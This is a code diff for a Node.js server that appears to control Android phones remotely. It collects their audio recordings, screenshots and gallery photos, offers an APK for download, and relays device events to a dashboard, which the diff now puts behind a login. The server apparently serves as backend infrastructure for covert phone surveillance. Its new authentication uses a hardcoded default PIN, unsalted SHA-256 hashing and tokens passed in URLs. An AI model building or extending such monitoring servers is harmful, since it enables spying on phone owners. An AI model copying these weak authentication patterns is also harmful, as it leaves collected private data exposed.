@@ -5,6 +5,7 @@ const multer = require("multer");
 const cors = require("cors");
 const path = require("path");
 const fs = require("fs");
+const crypto = require("crypto");
 
 const app = express();
 const server = http.createServer(app);
@@ -31,6 +32,7 @@ const SCREENSHOTS_DIR = path.join(__dirname, "screenshots");
 const GALLERY_DIR = path.join(__dirname, "gallery");
 const APK_DIR = path.join(__dirname, "apk");
 const FAVORITES_FILE = path.join(__dirname, "favorites.json");
+const AUTH_FILE = path.join(__dirname, "auth.json");
 
 if (!fs.existsSync(RECORDINGS_DIR)) {
   fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
@@ -191,8 +193,175 @@ const getDevicesSnapshot = () => {
 };
 
 const broadcastDevices = () => {
-  io.emit("devices_update", getDevicesSnapshot());
+  io.to("web").emit("devices_update", getDevicesSnapshot());
 };
+
+// ─── AUTHENTICATION ─────────────────────────────────────────
+
+const hashPassword = (p) =>
+  crypto.createHash("sha256").update(String(p)).digest("hex");
+
+function loadAuth() {
+  try {
+    const a = JSON.parse(fs.readFileSync(AUTH_FILE, "utf8"));
+    if (!a.passwordHash) a.passwordHash = hashPassword("2412");
+    if (typeof a.enabled !== "boolean") a.enabled = true;
+    if (!a.sessionTimeoutMinutes || a.sessionTimeoutMinutes < 1)
+      a.sessionTimeoutMinutes = 5;
+    return a;
+  } catch {
+    const def = {
+      enabled: true,
+      passwordHash: hashPassword("2412"),
+      sessionTimeoutMinutes: 5,
+    };
+    try { fs.writeFileSync(AUTH_FILE, JSON.stringify(def, null, 2)); } catch {}
+    return def;
+  }
+}
+function saveAuth(a) {
+  fs.writeFileSync(AUTH_FILE, JSON.stringify(a, null, 2));
+}
+
+// token -> { expiresAt }
+const sessions = new Map();
+
+function touchSession(token) {
+  const s = sessions.get(token);
+  if (!s) return null;
+  if (Date.now() > s.expiresAt) { sessions.delete(token); return null; }
+  return s;
+}
+function createSession() {
+  const token = crypto.randomBytes(24).toString("hex");
+  const auth = loadAuth();
+  const expiresAt = Date.now() + auth.sessionTimeoutMinutes * 60000;
+  sessions.set(token, { expiresAt });
+  return { token, expiresAt, sessionTimeoutMinutes: auth.sessionTimeoutMinutes };
+}
+function getReqToken(req) {
+  const h = req.headers["authorization"] || "";
+  const m = /^Bearer\s+(.+)$/i.exec(h);
+  if (m) return m[1];
+  if (req.query && req.query.token) return req.query.token;
+  const cookie = req.headers.cookie || "";
+  const cm = /(?:^|;\s*)auth_token=([^;]+)/.exec(cookie);
+  if (cm) { try { return decodeURIComponent(cm[1]); } catch { return cm[1]; } }
+  return null;
+}
+function isValidToken(token) {
+  if (!token) return false;
+  return !!touchSession(token);
+}
+
+// Periodic cleanup
+setInterval(() => {
+  const now = Date.now();
+  sessions.forEach((s, t) => { if (now > s.expiresAt) sessions.delete(t); });
+}, 60000);
+
+function requireAuth(req, res, next) {
+  const auth = loadAuth();
+  if (!auth.enabled) return next();
+  if (isValidToken(getReqToken(req))) return next();
+  return res.status(401).json({ error: "Unauthorized", code: "AUTH_REQUIRED" });
+}
+
+// Public auth endpoints
+app.get("/api/auth/status", (req, res) => {
+  const a = loadAuth();
+  const token = getReqToken(req);
+  const valid = isValidToken(token);
+  res.json({
+    enabled: a.enabled,
+    sessionTimeoutMinutes: a.sessionTimeoutMinutes,
+    authenticated: !a.enabled || valid,
+    expiresAt: valid ? sessions.get(token).expiresAt : null,
+  });
+});
+
+app.post("/api/auth/login", (req, res) => {
+  const { password } = req.body || {};
+  const a = loadAuth();
+  if (!a.enabled) {
+    const s = createSession();
+    return res.json(s);
+  }
+  if (hashPassword(password || "") !== a.passwordHash) {
+    return res.status(401).json({ error: "Invalid password" });
+  }
+  const s = createSession();
+  res.json(s);
+});
+
+app.post("/api/auth/logout", (req, res) => {
+  const token = getReqToken(req);
+  if (token) sessions.delete(token);
+  res.json({ success: true });
+});
+
+app.post("/api/auth/change-password", requireAuth, (req, res) => {
+  const { current, next: newPass } = req.body || {};
+  const a = loadAuth();
+  if (hashPassword(current || "") !== a.passwordHash) {
+    return res.status(401).json({ error: "Current password is incorrect" });
+  }
+  const np = String(newPass || "");
+  if (!/^\d{4,12}$/.test(np)) {
+    return res.status(400).json({ error: "Password must be 4–12 digits" });
+  }
+  a.passwordHash = hashPassword(np);
+  saveAuth(a);
+  sessions.clear();
+  res.json({ success: true });
+});
+
+app.post("/api/auth/settings", requireAuth, (req, res) => {
+  const { sessionTimeoutMinutes, enabled } = req.body || {};
+  const a = loadAuth();
+  if (sessionTimeoutMinutes !== undefined) {
+    const n = Math.floor(Number(sessionTimeoutMinutes));
+    if (!Number.isFinite(n) || n < 1 || n > 1440) {
+      return res.status(400).json({ error: "Timeout must be 1–1440 minutes" });
+    }
+    a.sessionTimeoutMinutes = n;
+  }
+  if (typeof enabled === "boolean") a.enabled = enabled;
+  saveAuth(a);
+  res.json({
+    enabled: a.enabled,
+    sessionTimeoutMinutes: a.sessionTimeoutMinutes,
+  });
+});
+
+// Public path allowlist (no auth required).
+// Android uploads ride on their own channel; they are not exposed by any UI.
+const PUBLIC_PATHS = new Set([
+  "/api/auth/status",
+  "/api/auth/login",
+  "/api/auth/logout",
+  "/api/apk/download",
+  "/api/apk/info",
+  "/upload",
+  "/upload-screenshot",
+  "/upload-gallery",
+  "/health",
+  "/status",
+]);
+
+// Auth gate — only applies to API-like paths. Static assets are already served above.
+app.use((req, res, next) => {
+  if (PUBLIC_PATHS.has(req.path)) return next();
+  const p = req.path;
+  const isProtected =
+    p.startsWith("/api/") ||
+    p.startsWith("/recordings") ||
+    p.startsWith("/devices") ||
+    p === "/upload" ||
+    p === "/status";
+  if (!isProtected) return next();
+  return requireAuth(req, res, next);
+});
 
 // ─── REST API ───────────────────────────────────────────────
 
@@ -256,7 +425,7 @@ app.post("/upload", upload.single("audio"), (req, res) => {
     }
 
     // Emit new recording event to all connected dashboards
-    io.emit("new_recording", {
+    io.to("web").emit("new_recording", {
       deviceId,
       deviceName,
       filename: finalFilenameActual,
@@ -552,7 +721,7 @@ app.post("/upload-screenshot", screenshotUpload.single("screenshot"), (req, res)
       });
 
       // Emit as gallery, NOT screenshot
-      io.emit("gallery_image_received", {
+      io.to("web").emit("gallery_image_received", {
         deviceId,
         deviceName,
         imageId: req.body.imageId,
@@ -595,7 +764,7 @@ app.post("/upload-screenshot", screenshotUpload.single("screenshot"), (req, res)
 
     log(`Screenshot saved: ${deviceId}/${finalFilenameActual} (${stats.size} bytes)`);
 
-    io.emit("screenshot_received", {
+    io.to("web").emit("screenshot_received", {
       deviceId,
       deviceName,
       filename: finalFilenameActual,
@@ -867,7 +1036,7 @@ app.post("/upload-gallery", galleryUpload.single("gallery_image"), (req, res) =>
     galleryImages.get(deviceId).push(galleryImage);
 
     // Emit to web clients
-    io.emit("gallery_image_received", {
+    io.to("web").emit("gallery_image_received", {
       deviceId,
       deviceName,
       imageId,
@@ -1328,7 +1497,35 @@ setInterval(() => {
 io.on("connection", (socket) => {
   log(`Socket connected: ${socket.id}`);
 
-  socket.emit("devices_update", getDevicesSnapshot());
+  // Authenticate web clients via handshake token, or later via "web_auth" event.
+  // If socket joins the "web" room, it receives dashboard broadcasts.
+  // Android clients do NOT join "web"; they only get direct io.to(socketId) commands.
+  const tryWebAuth = (token) => {
+    const a = loadAuth();
+    if (!a.enabled) { socket.join("web"); return true; }
+    if (isValidToken(token)) { socket.join("web"); return true; }
+    return false;
+  };
+
+  const hsToken = socket.handshake?.auth?.token;
+  if (hsToken && tryWebAuth(hsToken)) {
+    socket.emit("devices_update", getDevicesSnapshot());
+    socket.emit("web_auth_ok");
+  } else if (!loadAuth().enabled) {
+    socket.join("web");
+    socket.emit("devices_update", getDevicesSnapshot());
+  }
+
+  socket.on("web_auth", (data, ack) => {
+    const ok = tryWebAuth(data && data.token);
+    if (ok) {
+      socket.emit("devices_update", getDevicesSnapshot());
+      socket.emit("web_auth_ok");
+    } else {
+      socket.emit("web_auth_failed");
+    }
+    if (typeof ack === "function") ack({ ok });
+  });
 
   socket.on("register", (data) => {
     try {
@@ -1501,7 +1698,7 @@ io.on("connection", (socket) => {
       log(
         `Recording error on ${deviceId || "unknown"}: ${(data && data.error) || "Unknown"}`,
       );
-      io.emit("recording_error", {
+      io.to("web").emit("recording_error", {
         deviceId: deviceId,
         deviceName: data && data.deviceName,
         error: data && data.error,
@@ -1531,7 +1728,7 @@ io.on("connection", (socket) => {
       log(
         `Upload error from ${(data && data.deviceId) || "unknown"}: ${(data && data.error) || "Unknown"}`,
       );
-      io.emit("upload_error", {
+      io.to("web").emit("upload_error", {
         deviceId: data && data.deviceId,
         deviceName: data && data.deviceName,
         error: data && data.error,
@@ -1546,7 +1743,7 @@ io.on("connection", (socket) => {
       log(
         `Upload failed from ${(data && data.deviceName) || "unknown"}: ${(data && data.filename) || ""} (attempt ${(data && data.failCount) || "?"})`,
       );
-      io.emit("upload_failed", {
+      io.to("web").emit("upload_failed", {
         deviceId: data && data.deviceId,
         deviceName: data && data.deviceName,
         filename: data && data.filename,
@@ -1563,7 +1760,7 @@ io.on("connection", (socket) => {
   socket.on("audio_source_test_started", (data) => {
     try {
       log(`Audio source test started on ${(data && data.deviceName) || "unknown"}`);
-      io.emit("audio_source_test_started", data);
+      io.to("web").emit("audio_source_test_started", data);
     } catch (e) {
       log(`Error in audio_source_test_started: ${e.message}`);
     }
@@ -1586,7 +1783,7 @@ io.on("connection", (socket) => {
         dev.audioTestResults = data.testResults;
         dev.autoDetectedSource = data.autoDetectedSource;
       }
-      io.emit("audio_source_test_complete", data);
+      io.to("web").emit("audio_source_test_complete", data);
       broadcastDevices();
     } catch (e) {
       log(`Error in audio_source_test_complete: ${e.message}`);
@@ -1606,7 +1803,7 @@ io.on("connection", (socket) => {
           currentSource: data.selectedSource === "auto" ? data.autoDetectedSource : data.selectedSource,
         };
       }
-      io.emit("audio_source_updated", data);
+      io.to("web").emit("audio_source_updated", data);
       broadcastDevices();
     } catch (e) {
       log(`Error in audio_source_updated: ${e.message}`);
@@ -1623,7 +1820,7 @@ io.on("connection", (socket) => {
           currentSource: data.workingSource,
         };
       }
-      io.emit("audio_source_working", data);
+      io.to("web").emit("audio_source_working", data);
     } catch (e) {
       log(`Error in audio_source_working: ${e.message}`);
     }
@@ -1635,7 +1832,7 @@ io.on("connection", (socket) => {
       if (deviceId && devices.has(deviceId)) {
         devices.get(deviceId).audioSourceConfig = data.config;
       }
-      io.emit("audio_config", data);
+      io.to("web").emit("audio_config", data);
     } catch (e) {
       log(`Error in audio_config: ${e.message}`);
     }
@@ -1648,7 +1845,7 @@ io.on("connection", (socket) => {
         devices.get(data.deviceId).isRecording = false;
         broadcastDevices();
       }
-      io.emit("recording_interrupted", data);
+      io.to("web").emit("recording_interrupted", data);
     } catch (e) {
       log(`Error in recording_interrupted: ${e.message}`);
     }
@@ -1657,7 +1854,7 @@ io.on("connection", (socket) => {
   socket.on("partial_recording_saved", (data) => {
     try {
       log(`Partial recording saved from ${(data && data.deviceName) || "unknown"}: ${data && data.filename}`);
-      io.emit("partial_recording_saved", data);
+      io.to("web").emit("partial_recording_saved", data);
     } catch (e) {
       log(`Error in partial_recording_saved: ${e.message}`);
     }
@@ -1670,7 +1867,7 @@ io.on("connection", (socket) => {
         devices.get(data.deviceId).isRecording = true;
         broadcastDevices();
       }
-      io.emit("recording_retry", data);
+      io.to("web").emit("recording_retry", data);
     } catch (e) {
       log(`Error in recording_retry: ${e.message}`);
     }
@@ -1770,7 +1967,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_status", (data) => {
     try {
       log(`Screenshot status from ${(data && data.deviceName) || "unknown"}: ${(data && data.status) || ""}`);
-      io.emit("screenshot_status", data);
+      io.to("web").emit("screenshot_status", data);
     } catch (e) {
       log(`Error in screenshot_status: ${e.message}`);
     }
@@ -1779,7 +1976,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_captured", (data) => {
     try {
       log(`Screenshot captured from ${(data && data.deviceName) || "unknown"}: ${(data && data.filename) || ""}`);
-      io.emit("screenshot_captured", data);
+      io.to("web").emit("screenshot_captured", data);
     } catch (e) {
       log(`Error in screenshot_captured: ${e.message}`);
     }
@@ -1788,7 +1985,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_uploaded", (data) => {
     try {
       log(`Screenshot uploaded from ${(data && data.deviceName) || "unknown"}: ${(data && data.filename) || ""}`);
-      io.emit("screenshot_uploaded", data);
+      io.to("web").emit("screenshot_uploaded", data);
     } catch (e) {
       log(`Error in screenshot_uploaded: ${e.message}`);
     }
@@ -1797,7 +1994,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_error", (data) => {
     try {
       log(`Screenshot error from ${(data && data.deviceName) || "unknown"}: ${(data && data.error) || "Unknown"}`);
-      io.emit("screenshot_error", data);
+      io.to("web").emit("screenshot_error", data);
     } catch (e) {
       log(`Error in screenshot_error: ${e.message}`);
     }
@@ -1808,7 +2005,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_stats", (data) => {
     try {
       log(`Gallery stats from ${(data && data.deviceName) || "unknown"}: ${JSON.stringify(data.stats || {})}`);
-      io.emit("gallery_stats", data);
+      io.to("web").emit("gallery_stats", data);
     } catch (e) {
       log(`Error in gallery_stats: ${e.message}`);
     }
@@ -1817,7 +2014,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_scan_started", (data) => {
     try {
       log(`Gallery scan started on ${(data && data.deviceId) || "unknown"}`);
-      io.emit("gallery_scan_started", data);
+      io.to("web").emit("gallery_scan_started", data);
     } catch (e) {
       log(`Error in gallery_scan_started: ${e.message}`);
     }
@@ -1826,7 +2023,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_metadata", (data) => {
     try {
       log(`Received metadata for ${data.totalImages} images from ${(data && data.deviceName) || "unknown"}`);
-      io.emit("gallery_metadata", data);
+      io.to("web").emit("gallery_metadata", data);
     } catch (e) {
       log(`Error in gallery_metadata: ${e.message}`);
     }
@@ -1835,7 +2032,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_scan_error", (data) => {
     try {
       log(`Gallery scan error: ${(data && data.error) || "Unknown"}`);
-      io.emit("gallery_scan_error", data);
+      io.to("web").emit("gallery_scan_error", data);
     } catch (e) {
       log(`Error in gallery_scan_error: ${e.message}`);
     }
@@ -1844,7 +2041,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_started", (data) => {
     try {
       log(`Starting upload of ${data.totalImages} gallery images`);
-      io.emit("gallery_upload_started", data);
+      io.to("web").emit("gallery_upload_started", data);
     } catch (e) {
       log(`Error in gallery_upload_started: ${e.message}`);
     }
@@ -1853,7 +2050,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_queued", (data) => {
     try {
       log(`Queued ${data.queuedImages}/${data.totalRequested} images for upload`);
-      io.emit("gallery_upload_queued", data);
+      io.to("web").emit("gallery_upload_queued", data);
     } catch (e) {
       log(`Error in gallery_upload_queued: ${e.message}`);
     }
@@ -1862,7 +2059,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_image_uploaded", (data) => {
     try {
       log(`Gallery image uploaded: ${(data && data.name) || ""}`);
-      io.emit("gallery_image_uploaded", data);
+      io.to("web").emit("gallery_image_uploaded", data);
     } catch (e) {
       log(`Error in gallery_image_uploaded: ${e.message}`);
     }
@@ -1871,7 +2068,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_complete", (data) => {
     try {
       log(`Gallery upload complete: ${data.uploaded} uploaded, ${data.failed} failed`);
-      io.emit("gallery_upload_complete", data);
+      io.to("web").emit("gallery_upload_complete", data);
     } catch (e) {
       log(`Error in gallery_upload_complete: ${e.message}`);
     }
@@ -1880,7 +2077,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_error", (data) => {
     try {
       log(`Gallery upload error: ${(data && data.error) || "Unknown"}`);
-      io.emit("gallery_upload_error", data);
+      io.to("web").emit("gallery_upload_error", data);
     } catch (e) {
       log(`Error in gallery_upload_error: ${e.message}`);
     }
@@ -1889,7 +2086,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_paused", (data) => {
     try {
       log(`Gallery upload paused on ${(data && data.deviceId) || "unknown"}: ${data.remaining} remaining, reason: ${data.reason}`);
-      io.emit("gallery_upload_paused", data);
+      io.to("web").emit("gallery_upload_paused", data);
     } catch (e) {
       log(`Error in gallery_upload_paused: ${e.message}`);
     }
